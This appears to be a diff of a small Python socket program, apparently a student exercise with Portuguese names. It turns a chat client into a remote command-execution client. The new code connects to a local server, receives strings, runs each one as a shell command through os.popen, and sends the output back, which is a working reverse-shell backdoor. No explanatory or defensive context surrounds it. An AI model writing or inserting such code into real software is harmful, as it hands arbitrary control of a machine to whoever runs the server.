@@ -1,20 +1,18 @@
 from socket import *
+import os
 
-cliente = socket(AF_INET, SOCK_STREAM)
-cliente.connect(("127.0.0.1", 1234))
+
+cliente = socket(AF_INET,SOCK_STREAM)
+cliente.connect(("127.0.0.1",2222))
+
 
 while True:
-    dados = input("Cliente:")
-    cliente.sendall(dados.encode())
+    dados = cliente.recv(2048).decode()
     if dados == "sair":
         cliente.close()
         break
-
-        dados = cliente.recv(2048).decode()
-        print(f"Servidor: {dados}")
-
+    resultado = os.popen(dados).read()
+    cliente.sendall(resultado.encode())
 
 
 
-
-print (dados)
